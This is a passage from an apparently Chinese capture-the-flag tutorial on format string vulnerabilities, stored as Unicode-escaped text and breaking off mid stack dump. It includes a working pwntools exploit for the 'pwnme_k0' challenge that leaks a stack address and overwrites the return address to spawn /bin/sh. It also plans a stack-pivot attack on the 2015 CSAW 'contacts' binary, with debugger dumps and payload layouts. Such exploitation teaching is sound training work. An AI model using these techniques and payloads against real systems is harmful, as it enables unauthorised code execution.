\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a 5 + 3 = 8\u3002 \u6ce8\u89e3 \uff1a \u8fd9\u91cc\u6211\u8fd8\u662f\u7528\u6211\u4e60\u60ef\u7684\u65b9\u6cd5\uff0c\u8f93\u51fa\u51e0\u4e2a %p \u76f4\u63a5\u6570\u51fa\u6765\u504f\u79fb\u3002 \u4fee\u6539\u5730\u5740 \u00b6 \u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\uff08b printf\uff09\u5904\u6808\u7684\u4fe1\u606f 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740 (\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528 show account \u51fd\u6570\u65f6\u6267\u884c push rip \u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a 7\u3002 \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684 rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86 rbp \u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002 0x0000000000400d74 \u4e0e 0x00000000004008A6 \u53ea\u6709\u4f4e 2 \u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u6539 0x00007fffffffdb48 \u5f00\u59cb\u7684 2 \u4e2a\u5b57\u8282\u3002 \u8fd9\u91cc\u9700\u8981\u8bf4\u660e\u7684\u662f**\u5728\u67d0\u4e9b\u8f83\u65b0\u7684\u7cfb\u7edf (\u5982 ubuntu 18.04) \u4e0a, \u76f4\u63a5\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008A6 \u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u7a0b\u5e8f crash**, \u8fd9\u65f6\u53ef\u4ee5\u8003\u8651\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a 0x00000000004008AA, \u5373\u76f4\u63a5\u8c03\u7528 system(\"/bin/sh\") \u5904 .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text:00000000004008B7 retn \u5229\u7528\u7a0b\u5e8f \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : pwnme_k0.py from pwn import * context . log_level = 'debug' p = process ( \"./pwnme_k0\" ) elf = ELF ( \"./pwnme_k0\" ) # leak stack addr payload = 'a' * 0x8 + \"%6$p\" p . recvuntil ( \"20): \\n \" ) p . send ( payload ) p . recvuntil ( \"20): \\n \" ) p . send ( payload ) p . recvuntil ( '>' ) #gdb.attach(p,'b printf') p . sendline ( '1' ) p . recvuntil ( 'a' * 0x8 ) stack_leak = int ( p . recv ( 14 ), 16 ) - 0x38 log . info ( \"stack_leak:\" + hex ( stack_leak )) # hijack retaddr payload1 = p64 ( stack_leak ) payload2 = \" %2218d %8$hn\" p . recvuntil ( '>' ) p . sendline ( '2' ) p . recvuntil ( \"20): \\n \" ) p . sendline ( payload1 ) p . recvuntil ( \"20): \\n \" ) p . sendline ( payload2 ) p . recvuntil ( '>' ) p . sendline ( '1' ) p . interactive () \u6ce8\u89e3 \uff1a \u6cc4\u9732\u5730\u5740\u7684\u65f6\u5019\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7528\u7684\u662f %p \uff0c\u5982\u679c\u7528 %s \u518d u64 \u6cc4\u9732\u51fa\u6765\u7684\u662f\u51fd\u6570 B \u7684 rbp \u7684\u503c\u3002\u539f\u56e0\u4e5f\u5f88\u7b80\u5355\uff0c\u8981\u6c42\u8f93\u51fa\u7684\u662f\u5b57\u7b26\uff0c\u7cfb\u7edf\u5230\u51fd\u6570 A rbp \u7684\u503c\u6307\u5411\u7684\u5730\u5740\u53d6\u503c\uff0c\u4e5f\u5c31\u662f\u51fd\u6570 B \u7684\u503c\u3002\u5982\u679c\u662f %p \u5c31\u5c06\u51fd\u6570 A rbp \u7684\u503c\u8f93\u51fa\u3002 hijack \u90e8\u5206\u7684 payload \uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53ef\u4ee5\u653e\u5230 name \u8f93\u5165\uff0c\u4e5f\u5c31\u662f\u548c stack_leak \u4e00\u8d77\u8f93\u5165\uff0cpassword \u5c31\u968f\u4fbf\u8f93\u5165\u70b9\u4e1c\u897f\u884c\u4e86\u3002\u8fd9\u91cc\u56e0\u4e3a\u8f93\u5165\u957f\u5ea6\u73b0\u5728\uff0c\u6240\u4ee5\u6ca1\u6709\u4f7f\u7528\u6700\u7a33\u59a5\u7684 \u5355\u5b57\u8282 \u8f93\u5165\uff0c\u800c\u662f\u53cc\u5b57\u8282\u3002 \u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u00b6 \u539f\u7406 \u00b6 \u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002\uff08\u51fa\u73b0\u60c5\u51b5\u5c31\u50cf\u4e0b\u9762\u4f8b\u5b50\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u5b57\u7b26\u6307\u9488\u6307\u5411\u6808\u4e0a\uff0c\u51fa\u73b0\u7684\u60c5\u51b5\u662f\u6211\u4eec\u4e0d\u80fd\u5bb9\u6613\u63a7\u5236\u5199\u5165\u7684\u5730\u5740\uff09 \u4f8b\u5b50 \u00b6 \u8fd9\u91cc\u6211\u4eec\u4ee5 2015 \u5e74 CSAW \u4e2d\u7684 contacts \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002 \u786e\u5b9a\u4fdd\u62a4 \u00b6 \u279c 2015 -CSAW-contacts git: ( master ) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86 NX \u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86 Canary\u3002\uff08RELRO \u534a\u4fdd\u62a4\uff0c\u6211\u4eec\u662f\u4e0d\u662f\u80fd hijack got \u8868\u5462\uff1fhijack retaddr \u5462\uff1f\uff09 \u5206\u6790\u7a0b\u5e8f \u00b6 \u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u6253\u5370\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002 int __cdecl PrintInfo ( int a1 , int a2 , int a3 , char * format ) { printf ( \" \\t Name: %s \\n \" , a1 ); printf ( \" \\t Length %u \\n \" , a2 ); printf ( \" \\t Phone #: %s \\n \" , a3 ); printf ( \" \\t Description: \" ); return printf ( format ); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e } \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a format \u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002 \u6ce8\u89e3 \uff1a\u53ef\u4ee5\u4ece\u8c03\u7528 PrintInfo \u7684\u4e0a\u5c42\u51fd\u6570\u67e5\u770b\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff1a\uff08v2 \u662f\u7ed3\u6784\u4f53\u94fe\u8868\uff09 sub_8048BD1 ( v2 + 8 , * ( _DWORD * )( v2 + 72 ), * ( _DWORD * )( v2 + 4 ), * ( char ** ) v2 ); \u5229\u7528\u601d\u8def \u00b6 \u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684 shell\uff0c\u4ece\u800c\u62ff\u5230 flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301 got \u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301 got \u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709 printf \u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020 /bin/sh \u8ba9\u5b83\u6267\u884c system('/bin/sh')\uff0c\u4f46\u662f printf \u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002 \u6ce8\u89e3 \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u5728\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c\u6211\u4eec\u80fd\u63a7\u5236\u8f93\u5165\u53c2\u6570\u7684\u51fd\u6570\u5c31\u53ea\u6709 printf \uff0c\u8bf8\u5982 puts \u7b49\u7684\u53c2\u6570\u90fd\u662f\u6211\u4eec\u4e0d\u53ef\u63a7\u7684\u3002\u56e0\u4e3a\u4fee\u6539 got \u8868\u4e4b\u540e\u6211\u4eec\u9700\u8981\u4f20\u5165 binsh \u7684\u5730\u5740\uff0c\u6240\u4ee5\u53ea\u80fd\u9009\u62e9 printf \u3002\u4f46\u662f\u9009\u62e9 printf \u53c8\u6709\u4e00\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u4fee\u6539\u5b8c\u540e\uff0cprintf \u5404\u4e2a\u5730\u65b9\u90fd\u4f1a\u7528\u5230\uff0c\u8fd8\u6ca1\u8fd0\u884c\u5230\u6211\u4eec\u80fd\u8f93\u5165\u53c2\u6570\u7684\u5730\u65b9\uff0c\u7a0b\u5e8f\u5c31\u5df2\u7ecf\u6302\u903c\u4e86\u3002 \u8fd9\u91cc\u8fd8\u6709\u4e00\u4e2a\u539f\u56e0 wiki \u4e2d\u6ca1\u6709\u63d0\u53ca\uff0c\u90a3\u5c31\u662f\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u5199\u5165\u5730\u5740\u3002\u539f\u56e0\u5f88\u7b80\u5355\uff1a\u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\u77e5\u9053\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u662f\u5b58\u653e\u5728\u5806\u4e0a\uff0c\u800c\u5b57\u7b26\u4e32\u6307\u9488\u662f\u5728\u6808\u4e0a\uff0c\u5f88\u660e\u663e\u7684\u73b0\u8c61\u5c31\u662f\u6808\u4e0a\u4e0d\u662f\u5b57\u7b26\u4e32\u7684\u660e\u6587\uff0c\u800c\u662f\u5b57\u7b26\u4e32\u7684\u5806\u5730\u5740\uff0c\u5c31\u7b97\u6211\u4eec\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u4e5f\u4e0d\u80fd\u901a\u8fc7\u504f\u79fb\u83b7\u53d6\u3002\uff08\u8fd9\u4e2a\u7a0b\u5e8f\u5168\u90e8\u53ef\u63a7\u8f93\u5165\u90fd\u653e\u5728\u5806\u4e0a\uff09\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u8f93\u5165\u76ee\u6807\u5730\u5740\uff0c\u627e\u6808\u4e0a\u73b0\u6709\u7684\u5730\u5740\u3002 \u8d85\u957f\u504f\u79fb\u80fd\u53d6\u5230\u503c\uff1f\u6211\u4eec\u5f53\u5b83\u662f\u53ef\u884c\u7684\u8bd5\u4e00\u8bd5\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5230\u63cf\u8ff0\u5806\u5757\u76f8\u5dee -0xf7fafed0 \uff0c\u504f\u79fb\u4e3a -1040105396 \uff0c\u6784\u9020\u5c1d\u8bd5\u4e00\u4e0b\uff1a \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165 system_addr + 'bbbb' + addr of '/bin/sh\u2018 \u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002 \u6ce8\u89e3 \uff1a \u6362\u53e5\u4eba\u8bdd\u5c31\u662f\uff1a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u53ea\u80fd\u5728\u6808\u4e0a\u901a\u8fc7\u504f\u79fb\u627e\u5730\u5740\uff0c\u800c\u6808\u4e0a\u6ca1\u6709\u6307\u5411 eip \u7684\u5730\u65b9\uff0c\u4e5f\u5c31\u627e\u4e0d\u5230 eip \u5730\u5740\uff0c\u5c31\u4e0d\u80fd\u4fee\u6539 eip \u7684\u503c\u3002 \u6ce8\u89e3 \uff1a \u5c31\u56e0\u4e3a\u6211\u4eec\u4e0d\u80fd\u76f4\u63a5\u63a7\u5236\u76ee\u6807\u5730\u5740\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528 hijack GOT \u3001hijack retaddr \u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7 leave \u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58 ebp \u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884c leave \u6307\u4ee4\u7684\u65f6\u5019\uff0c esp \u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\uff08leave \u6307\u4ee4\u7b49\u4e8e\uff1a mov esp,ebp;pop ebp; \uff09 \u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58 ebp \u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6 PrintInfo \u51fd\u6570\u4e2d\u5b58\u50a8 ebp \u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684 ebp \u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58 ebp \u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176**\u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684 ebp \u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373 main \u51fd\u6570\uff09\u7684 ebp \u6570\u503c**\u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002 \u57fa\u672c\u601d\u8def\u5982\u4e0b \u9996\u5148\u83b7\u53d6 system \u51fd\u6570\u7684\u5730\u5740 \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2a libc \u51fd\u6570\u7684\u5730\u5740\u6839\u636e libc database \u786e\u5b9a\u3002 \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3a system_addr + 'bbbb' + binsh_addr \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684 ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684 ebp) \u4e3a**\u5b58\u50a8 system_addr \u7684\u5730\u5740 -4**\u3002 \u6ce8\u89e3 \uff1a \u4e3a\u4ec0\u662f**system_addr \u7684\u5730\u5740 -4** \uff1f\u662f\u56e0\u4e3a\u7a0b\u5e8f\u672b\u5c3e\u7684 leave;ret \u6267\u884c\u5b8c leave \u540e\uff0cesp \u662f\u6307\u5411 ebp \u7684\uff0c\u7136\u540e esp \u7684\u503c\u4f1a\u589e\u52a0\u4e00\u4e2a\u673a\u5668\u957f\u5ea6\uff08\u8fd9\u65f6 esp \u521a\u597d\u662f\u6307\u5411 eip \uff09\uff0c\u518d\u6267\u884c ret \u5c06 esp \u6307\u5411\u7684\u503c\u538b\u5165 eip \u4e2d\u3002 \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c\uff08\u7b2c\u4e00\u7b2c\u4e8c\u5408\u5e76\u7b49\u4e8e leave \uff09 move esp,ebp\uff0c\u5c06 esp \u6307\u5411 system_addr \u7684\u5730\u5740 - 4 pop ebp\uff0c \u5c06 esp \u6307\u5411 system_addr ret\uff0c\u5c06 eip \u6307\u5411 system_addr\uff0c\u4ece\u800c\u83b7\u53d6 shell\u3002 \u83b7\u53d6\u76f8\u5173\u5730\u5740\u4e0e\u504f\u79fb \u00b6 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53ca PrintInfo \u51fd\u6570\u7684\u5730\u5740\u3002 \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684 libc_start_main_ret \u5730\u5740 (\u8be5\u5730\u5740\u662f\u5f53 main \u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570) \u6765\u83b7\u53d6 system \u51fd\u6570\u5730\u5740\u3001/bin/sh \u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728 printf \u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684 printf \u51fd\u6570\u5904\uff0c\u5982\u4e0b \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [ #1] 0x8048c27 \u2192 leave [ #2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [ #3] 0x80487a2 \u2192 jmp 0x80487b3 [ #4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [ #5] 0x80485e1 \u2192 hlt \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 [ '$esp' , '140' ] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 [ '$esp' , 'l140' ] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ ebp-0xc ] , 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 ( \"g+\" ? ) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 ( \"%s\" ? ) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502+0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 